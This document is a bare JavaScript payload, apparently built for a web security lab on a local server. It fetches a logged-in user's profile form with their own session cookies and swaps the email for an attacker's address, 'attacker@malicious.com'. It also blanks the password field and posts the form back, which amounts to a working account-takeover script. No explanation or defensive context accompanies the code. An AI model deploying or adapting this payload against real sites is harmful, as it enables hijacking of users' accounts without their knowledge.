;(async () => {
  // 1. Fetch the profile page HTML
  const html = await fetch("http://127.0.0.1:5000/profile", { credentials: "include" }).then(r => r.text());
  
  // 2. Parse the document and find the profile form
  const doc = new DOMParser().parseFromString(html, "text/html");
  const form = doc.querySelector("form");
  
  // 3. Resolve the form's destination action URL
  const action = new URL(form.getAttribute("action") || "", "http://127.0.0.1:5000/profile").href;
  
  // 4. Extract existing inputs and overwrite the email field
  const data = new FormData(form);
  data.set("email", "attacker@malicious.com");
  data.set("password", ""); // Included to match the empty password input field in the UI

  // 5. Post the modified payload back to the server using URL encoding
  const res = await fetch(action, { 
    method: "POST", 
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams(data) 
  });

  console.log(res.status);
})();
